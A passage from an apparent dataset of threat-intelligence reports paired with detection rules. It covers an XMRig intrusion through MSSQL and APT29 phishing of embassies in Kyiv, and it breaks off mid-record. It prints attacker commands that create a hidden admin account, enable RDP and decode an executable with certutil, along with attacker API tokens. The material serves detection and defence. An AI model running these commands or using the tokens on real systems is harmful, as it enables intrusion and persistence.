/f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "Base64 MZ Header In CommandLine",
      "id": "22e58743-4ac8-4a9f-bf19-00a0428d8c5f",
      "status": "test",
      "description": "Detects encoded base64 MZ header in the commandline",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "TVqQAAMAAAAEAAAA",
            "TVpQAAIAAAAEAA8A",
            "TVqAAAEAAAAEABAA",
            "TVoAAAAAAAAAAAAA",
            "TVpTAQEAAAAEAAAA"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_inline_base64_mz_header.yml",
    "id": "541"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/",
    "markdown": "# Diplomats Beware: Cloaked Ursa Phishing With a Twist\n\n## Executive Summary\n\nRussia’s Foreign Intelligence Service hackers, which we call Cloaked Ursa (aka APT29, UAC-0004, Midnight Blizzard/Nobelium, Cozy Bear) are well known for targeting diplomatic missions globally. Their initial access attempts over the past two years have predominantly used phishing lures with a theme of diplomatic operations such as the following:\n\n- *Notes verbale* (semiformal government-to-government diplomatic communications)\n- Embassies’ operating status updates\n- Schedules for diplomats\n- Invitations to embassy events\n\nThese types of lures are generally sent to individuals who handle this type of embassy correspondence as part of their daily jobs. They are meant to entice targets to open the files on behalf of the organization they work for.\n\nRecently, Unit 42 researchers observed instances of Cloaked Ursa using lures focusing on the diplomats themselves more than the countries they represent. We have identified Cloaked Ursa targeting diplomatic missions within Ukraine by leveraging something that all recently placed diplomats need – a vehicle.\n\nWe observed Cloaked Ursa targeting at least 22 of over 80 foreign missions located in Kyiv. While we don’t have details on their infection success rate, this is a truly astonishing number for a clandestine operation conducted by an advanced persistent threat (APT) that the United States and the United Kingdom publicly attribute to Russia’s Foreign Intelligence Service (SVR).\n\nOur assessment that Cloaked Ursa is responsible for these lures is based on the following:\n\n- Similarities to other known Cloaked Ursa campaigns and targets\n- Use of known Cloaked Ursa TTPs\n- Code overlap with other known Cloaked Ursa malware\n\nThese unconventional lures are designed to entice the recipient to open an attachment based on their own needs and wants instead of as part of their routine duties.\n\nThe lures themselves are broadly applicable across the diplomatic community and thus are able to be sent and forwarded to a greater number of targets. They’re also more likely to be forwarded to others inside of an organization as well as within the diplomatic community.\n\nOverall, these factors increase the odds of a successful compromise within targeted organizations. While not likely to fully supplant diplomatic operations-themed lures, these lures focusing on individuals do provide Cloaked Ursa with new opportunities and a broader range of susceptible potential espionage targets.\n\nPalo Alto Networks customers receive protections against the types of threats discussed in this article by products including:\n\n- Cortex XDR\n- WildFire\n- Cloud-Delivered Security Services for the Next-Generation Firewall, including Advanced URL Filtering and DNS Security\n\nIf you believe you have been compromised, the Unit 42 Incident Response team can provide a personalized response.\n\n### Related Unit 42 Topics\n\n- Russia\n- Ukraine\n- phishing\n\n### Cloaked Ursa APT Group AKAs\n\n- APT29\n- UAC-0004\n- Midnight Blizzard / Nobelium\n- Cozy Bear\n\n## BMW for Sale\n\nOne of the most recent of these novel campaigns that Unit 42 researchers observed appeared to use the legitimate sale of a BMW to target diplomats in Kyiv, Ukraine, as its jumping off point.\n\nThe campaign began with an innocuous and legitimate event. In mid-April 2023, a diplomat within the Polish Ministry of Foreign Affairs emailed his legitimate flyer to various embassies advertising the sale of a used BMW 5-series sedan located in Kyiv. The file was titled `BMW 5 for sale in Kyiv - 2023.docx`.\n\nThe nature of service for professional diplomats is often one that involves a rotating lifestyle of short- to mid-term assignments at postings around the world. Ukraine presents newly assigned diplomats with unique challenges, being in an area of armed conflict between Russia and Ukraine.\n\nHow do you ship personal goods, procure safe accommodations and services, and arrange for reliable personal transportation while in a new country? The sale of a reliable car from a trusted diplomat could be a boon for a recent arrival, which Cloaked Ursa viewed as an opportunity.\n\nWe assess that Cloaked Ursa likely first collected and observed this legitimate advertising flyer via one of the email’s recipients’ mail servers being compromised, or by some other intelligence operation. Upon seeing its value as a generic yet broadly appealing phishing lure, they repurposed it.\n\nTwo weeks later, on May 4, 2023, Cloaked Ursa emailed their illegitimate version of this flyer to multiple diplomatic missions throughout Kyiv. These illegitimate flyers use benign Microsoft Word documents of the same name as that sent by the Polish diplomat.\n\n```image\nAlt: Example lure used in BMW campaign\nDescription: The image is a phishing lure designed to appear as a legitimate advertisement for a BMW 5-series sedan for sale in Kyiv. It features two images of the car, alongside text highlighting its price of 7,500 Euros and details about its condition, mileage, engine type, and features. The layout includes a link labeled \"More high quality photos are here\" that leads to a shortened URL, indicating a potential malicious redirect. The image mimics a realistic car sale flyer, which is used to trick recipients into clicking the link and downloading malware.\nTranscription: |\n  CAR FOR SALE IN KYIV\n  THE PRICE IS REDUCED!!!\n  \n  BMW 5 (F10) 2.0 TDI, 7,500 Euros!!\n  Very good condition, low fuel consumption\n  \n  More high quality photos are here: https://t.ly/...\n  \n  Model: BMW 5, 2.0 TDI (184 HP)\n  Year: April 2011\n  Mileage: 266,000 km\n  Engine: 2.0 Diesel\n  Transmission: Mechanic\n  Colour: Black, black leather interior\n  Package: A/C, set of summer and winter tires, ABS/ESP, led lights, cruise control, multifunction steering wheel, CD, electric seats, electric windows, engine control, rain sensor, electrical hand brake, airbags, start-stop system.\n  Price: 7,500 Euros\n  Custom: NOT CLEARED\n  Contact:\n```\n\n*Figure 1. Example lure used in BMW campaign (SHA256 311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517).*\n\nThe key difference with these illegitimate versions is that if a victim clicks on a link offering “more high quality photos,” a URL shortener service (either `t[.]ly` or `tinyurl[.]com`) will redirect them to a legitimate site. This site would have been coopted by Cloaked Ursa, resulting in the download of a malicious payload.\n\nWhen a victim attempts to view any of the “high quality photos” (shown in Figure 2) in the download, the malware executes silently in the background while the selected image displays on the victim’s screen.\n\n```image\nAlt: Windows shortcut files masquerading as image files\nDescription: The image depicts a file explorer view showing multiple files named 'bmw1.png', 'bmw2.png', 'bmw3.png', etc., up to 'bmw9.png'. Each of these files has a size of 3 KB and a modified date of May 3, 2023, at 12:49 AM. A properties window for 'bmw1.png' is also shown, indicating that it is actually a shortcut file (type: Shortcut) rather than a genuine image file. The file path is shown as E:\\, and its size is listed as 2.26 KB.\nTranscription: |\n  Name                     Date modified      Type      Size\n  ---------------------------------------------------------\n  bmw1.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw2.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw3.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw4.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw5.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw6.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw7.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw8.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw9.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  \n  bmw1.png Properties\n  ---------------------------------------------------------\n  Property      Value\n  -----------------------------------------------\n  File          Name: bmw1.png.lnk\n                Type: Shortcut\n                Folder path: E:\\\n                Size: 2.26 KB\n                Date created: 5/3/2023 12:49 AM\n                Date modified: 5/3/2023 12:49 AM\n```\n\n*Figure 2. Windows shortcut files masquerading as image files.*\n\nFigure 3 illustrates the full execution flow.\n\n```image\nAlt: Execution flow\nDescription: The image illustrates the execution flow of a cyber attack initiated through a phishing campaign. It details the sequence of file types involved, starting from a DOCX file that leads to HTML and ISO files, which contain malicious LNK files masquerading as PNG images. The process shows how an executable (EXE) file loads a malicious DLL via DLL hijacking, ultimately leading to the injection of shellcode into a running Windows process. The final payload beacons to Dropbox and Microsoft Graph API-based command and control (C2) servers, demonstrating the sophisticated nature of the attack.\nTranscription: |\n  [Diagram]\n  1. DOCX\n     - Hyperlink leads to download of further HTML\n  \n  2. HTML\n     - HTML Smuggling used to obscure ISO file\n  \n  3. ISO\n     - ISO contains a number of LNK files masquerading as images\n  \n  4. LNK\n     - Execution of LNK runs legitimate EXE and opens PNG file\n  \n  5. EXE\n     - EXE loads malicious DLL via DLL hijacking\n  \n  6. DLL\n     - Encrypted shellcode is read into memory and decrypted\n     - Shellcode is injected to running Windows process\n  \n  7. Shellcode\n     - Shellcode decrypts and loads final payload inside current process\n  \n  8. Final payload\n     - Beacons to Dropbox and Microsoft Graph API-based C2s\n```\n\n*Figure 3. Execution flow.*\n\nThese pictures are actually Windows shortcut files masquerading as PNG image files.\n\nWe’ve observed two versions of these illegitimate flyers. The only difference between the two is the shortened URL used in each case. The URLs ultimately redirect the victim to the same coopted site (`hxxps://resetlocations[.]com/bmw.htm`).\n\nAt the time of this writing, one of the flyer versions (SHA256: `311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517`) is detected as malicious by multiple vendors according to VirusTotal, while the other version (SHA256: `8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596`) is not detected. For a full overview of the malware, please refer to the Appendix.\n\nOverall, we observed Cloaked Ursa targeting at least 22 of over 80 foreign missions located in Kyiv in this campaign, as shown in Table 1. The actual number targeted is likely higher. This is staggering in scope for what generally are narrowly scoped and clandestine APT operations.\n\n| Known Embassies in Kyiv Targeted by Cloaked Ursa in BMW Campaign |\n|------------------------------------------------------------------|\n| Albania                                                          |\n| Argentina                                                        |\n| Canada                                                           |\n| Cyprus                                                           |\n| Denmark                                                          |\n| Estonia                                                          |\n| Greece                                                           |\n| Iraq                                                             |\n| Ireland                                                          |\n| Kuwait                                                           |\n| Kyrgyzstan                                                       |\n| Latvia                                                           |\n| Libya                                                            |\n| Netherlands                                                      |\n| Norway                                                           |\n| Slovakia                                                         |\n| Spain                                                            |\n| Sudan                                                            |\n| Turkey                                                           |\n| Turkmenistan                                                     |\n| United States                                                    |\n| Uzbekistan                                                       |\n\n*Table 1. Known embassy targets of BMW campaign.*\n\nFor the activity we observed, Cloaked Ursa used publicly available embassy email addresses for approximately 80% of the targeted victims. The remaining 20% consisted of unpublished email addresses not found on the surface web.\n\nThis indicates that attackers likely also used other collected intelligence to generate their victim target list, to ensure they were able to maximize their access to desired networks. The majority of the targeted organizations in this campaign were embassies. However, we also observed Cloaked Ursa targeting both Turkish Ministry of Trade representatives in Ukraine (via their `ticaret[.]gov[.]tr` work emails) and their embassy in the BMW campaign.\n\nWhile there were a handful of emails sent directly to individuals’ work addresses within the campaign, the majority of the targeted emails consisted of general inboxes for the embassy, such as `country.embassy@mfa[.]gov[.]xx`. Despite the thought and detail put into targets for this campaign, at least two of the email addresses contained errors and never reached the intended targets. Overall, the use of these group inboxes likely increased the odds of the emails being reviewed and passed on to individuals within the embassies looking for transportation.\n\nWith a few of the embassies we observed being targeted, this was done via group emails hosted on free online webmail services. While these services offer some protection, they also outsource a portion of the security provided to targeted organizations and their employees to external entities. The use of free online webmail could have the unintended consequence of increasing a diplomatic organization’s difficulty in observing and understanding the totality of threats targeting it while also increasing its attack surface.\n\n## Turkish Diplomats: Humanitarian Assistance for Earthquake\n\nAnother of the novel Cloaked Ursa campaigns we observed likely targeted the Turkish Ministry of Foreign Affairs (MFA) earlier in 2023, within a February to March timeframe. While we were unable to obtain the malicious email lure associated with this campaign, we know that it related to a document that purported to be Turkish MFA guidance on humanitarian assistance pertaining to the Feb. 21, 2023, earthquake in Turkey. The earthquake in late February further ravaged a region already devastated by a massive earthquake two weeks earlier, which ultimately killed more than 50,000 and displaced more than 5.9 million people.\n\nWe were able to determine this second campaign targeting the MFA based on a PDF (shown in Figure 4) that was contained in a downloaded payload (SHA256: `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839` – for a full overview of the malware, please refer to the Appendix).\n\nNot one to let a disaster and the highly sympathetic charge it generates go to waste, Cloaked Ursa likely saw a lure providing MFA guidance on humanitarian support for this tragedy as a way to ensure a high level of interest from their targets – these recipients would feel a patriotic obligation and would understand the MFA’s expectations to support their nation and its victims. In addition, given the timely and momentous nature of the lure, it was almost certainly forwarded by concerned employees to others in their organization who would be interested in the guidance.\n\n```image\nAlt: Excerpt from Turkish MFA memorandum\nDescription: The image is a PDF excerpt of a memorandum from the Turkish Ministry of Foreign Affairs. It contains official communication regarding humanitarian assistance for citizens affected by earthquakes in Kahramanmaraş, dated February 21, 2023. The document outlines the response to the disaster, including directives for financial contributions from ministry personnel to aid efforts coordinated with the Disaster and Emergency Management Authority (AFAD). The text is in Turkish, featuring headers and organizational details typical of governmental documents.\nTranscription: |\n  T.C. DIŞİŞLERİ BAKANLIĞI\n  Personel Genel Müdürlüğü\n  ______________________________________________________________________\n  \n  GENELGE\n  \n  Tarih : 21.02.2023-E-2023/80327456-PEGM/35614431\n  Konu : Kahramanmaraş'ta meydana gelen depremlerden zarar gören vatandaşlarımıza yardım\n  Dosyası : 010.06.999/Diğer\n  Kimden : PEGM\n  Dağıtım : Tüm Teşkilata (G) (N)\n  \n  21 Şubat 2023 tarihinde Kahramanmaraş’ta meydana gelen ve çevre illerde büyük hasara yol açan deprem felaketlerinden zarar gören vatandaşlarımıza İçişleri Bakanlığı Afet ve Acil Durum Yönetimi Başkanlığı (AFAD) iletilmek üzere Bakanlığımız personeli tarafından maddi katkıda bulunulması Makam tarafından uygun görülmüştür.\n  \n  Bu çerçevede, halihazırda sürekli görevle yurtdışına atanmış (Hukuk Müşaviri, Danışman ve Ataşe Yardımcıları dahil) Bakanlığımız mensuplarının net dış maaşlarının asgari %10’unu; merkez ve yurtdışı teşkilatımızda görevli diğer mensuplarımızın ise arzu ettikleri miktardaki gönüllü katkılarını AFAD Başkanlığı tarafından başlatılan yardım kampanyasına aktarmak üzere 26.03.2023 tarihine kadar aşağıda kayıtlı banka hesaplarına yatırmaları beklenmektedir.\n  \n  Temsilcilerimizce toplanan nihai meblağ ile ilgili bilginin 21.03.2023 tarihinde\n  perd@mfa.gov.tr adresine iletilmesi önemle rica olunur.\n```\n\n*Figure 4. Excerpt from Turkish MFA memorandum.*\n\n## Conclusion\n\nDiplomatic missions will always be a high-value espionage target. Sixteen months into the Russian invasion of Ukraine, intelligence surrounding Ukraine and allied diplomatic efforts are almost certainly a high priority for the Russian government.\n\nAs the above campaigns show, diplomats should appreciate that APTs continually modify their approaches – including through spear phishing – to enhance their effectiveness. They will seize every opportunity to entice victims into compromise. Ukraine and its allies need to remain extra vigilant to the threat of cyber espionage, to ensure the security and confidentiality of their information.\n\n### Recommendations\n\n- Train newly assigned diplomats and employees to a diplomatic mission on the cybersecurity threats for the region prior to their arrival. This training should include the specific tactics, techniques and procedures (TTPs) used by APTs in that region.\n- Always take extra precautions to observe URL redirection when using URL-shortening services.\n- Always be cautious of downloads, even from seemingly innocuous or legitimate sites. APTs routinely co-opt legitimate sites or services for malicious purposes.\n- Always take extra precautions with attachments that require a web browser to open. These types of attachments include the following file extensions: `.hta`, `.htm`, `.html`, `.mht`, `.mhtml`, `.svg`, `.xht` and `.xhtml`.\n- Always verify file extension types to ensure you are opening the type of file you intend to. If the file extension does not match, or if it is attempting to obfuscate its nature, it is very likely malicious.\n- When received as an attachment to an email, or when downloaded from a link within an email, always look for hidden files and directories in archives such as those with the extensions `.zip`, `.rar`, `.7z`, `.tar` and `.iso`. The presence of hidden files or directories could indicate the archive is malicious.\n- Consider disabling JavaScript as a rule.\n\nPalo Alto Networks customers receive protections against the types of threats discussed in this article by products including:\n\n- Cortex XDR\n- WildFire\n- Cloud-Delivered Security Services for the Next-Generation Firewall, including Advanced URL Filtering and DNS Security.\n\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:\n\n- North America Toll-Free: 866.486.4842 (866.4.UNIT42)\n- EMEA: +31.20.299.3130\n- APAC: +65.6983.8730\n- Japan: +81.50.1790.0200\n\nPalo Alto Networks disclosed this activity to Microsoft and Dropbox.\n\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance.\n\n## Indicators of Compromise\n\n### Samples\n\n- `311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517`\n- `8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596`\n- `47e8f705febc94c832307dbf3e6d9c65164099230f4d438f7fe4851d701b580b`\n- `79a1402bc77aa2702dc5dca660ca0d1bf08a2923e0a1018da70e7d7c31d9417f`\n- `38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534`\n- `706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7`\n- `c62199ef9c2736d15255f5deaa663158a7bb3615ba9262eb67e3f4adada14111`\n- `cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a`\n- `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839`\n- `60d96d8d3a09f822ded0a3c84194a5d88ed62a979cbb6378545b45b04353bb37`\n- `03959c22265d0b85f6c94ee15ad878bb4f2956a2b0047733edbd8fdc86defc48`\n\n### URLs\n\n- `hxxp://tinyurl[.]com/ysvxa66c`\n- `hxxp://t[.]ly/1IFg`\n- `hxxps://resetlocations[.]com/bmw.htm`\n- `hxxps://tinyurl[.]com/mrxcjsbs`\n- `hxxps://simplesalsamix[.]com/e-yazi.html`\n- `hxxps://www.willyminiatures[.]com/e-yazi.html`\n\n### Known Email Senders\n\n- `dawid.tomaszewski@resetlocations[.]com`\n- `ops.rejon4@kazmierz[.]pl`\n\n### BMW Payload: Dropbox and MS Graph API Tokens and Secrets\n\n- `Teams_test`\n- `840aae0d-cd89-4869-bce1-94222c33035e`\n- `M.R3_BL2.-CYZcTMwdTTD5X9lMxE*wscQcrZ56RUoklIvNkUw5pW1kJ9tfqvv1vRT8VgOb8uXtJTPB3E2CKV!pmm4V6DF8TRvo60QFCxMnUAnuv3jJ78TqHMdxPHONUDeI!B4DbLyg6ZjPZzghLXtmTZqzxOfpCUInOnhFJGoiL6kob7hKVhxm2dJQ9whK9zORxKg0FAnmd0tAR9lKJJaIUkVLcQ939EG2EKG9xsVVWwL04kX0092j7r2jo0rQR9Nqe4DuG0cRAMoODktAbTiuIsehkO5bM0ZuHsDuRr6mMoJrpwbqP0nt5PqJ*E7TS2scdYYOxnQ0mQ$$`\n- `iofd62cx8jy9vyp`\n- `sx6qt5iw2t9y7r8`\n- `GCy8UdFrumsAAAAAAAAAASYLcT6_Rjx8PYFAvKH3Q3fT27eYzNsXJYCz7320YBIM`\n\n### Turkey MFA Payload: Dropbox and MS Graph API Tokens and Secrets\n\n- `e0f94357-98c9-475d-94eb-27b6c74a6429`\n- `mytestworkapp1`\n- `M.R3_BL2.-CUanxFBYCxVzJ6hwSYPoLZ49NQ3X*y5rETt!aN*487MvafwQFn7kevSiXUwpGnHaquakM8vH6iESLDlXP38hmqQn98rRLvOzWwlKmD!8Xb5yEewCaa13S4Y1VyTIswo54Ez5ihRdUYCkYxkidMsZBn5!4icBZKpwC9hDW6G8OLcj8c2ZDtl8kUJ5PaX5TTDgXRzYdLPcqJFiNREjNg0*L569xMG1D14JpmjuO3HLBN2OclUv6c9FeuRwe5EuHA9aKhdqWkdjxWbnGGMgn9SnyDF7VSVCYT0*KBPNE!WYm*CXbE4jNTqJnkyPzvDJtj0OoA$$`\n- `3a1n71ujslwse9v`\n- `75vedbskd505jyk`\n- 